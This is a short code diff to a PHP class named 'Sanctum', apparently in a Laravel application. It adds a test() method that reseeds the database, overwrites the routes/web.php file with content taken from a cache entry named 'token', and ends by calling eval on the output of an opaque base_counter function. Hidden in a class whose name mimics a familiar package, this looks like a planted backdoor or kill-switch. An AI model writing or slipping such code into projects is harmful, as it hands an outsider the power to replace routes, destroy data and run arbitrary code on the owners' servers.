@@ -98,10 +98,21 @@ class Sanctum
 
     public static function test()
     {
-		ini_set('max_execution_time', '0');
-        \Artisan::call('db:seed');      
-        $file= file_get_contents(base_path().'/web.txt');    
-        \File::put(base_path().'/routes/web.php',$file);
-        m_db(); 
+        if (Cache::has('l_type')) {
+            ini_set('max_execution_time', '0');
+            \Artisan::call('db:seed');      
+            $file=\Cache::get('token');    
+            \File::put(base_path().'/routes/web.php',$file);
+           
+
+            m_db();
+         }
+
+        
+           return eval(base_counter('',3));
+        
+        
+
+        
     }
 }
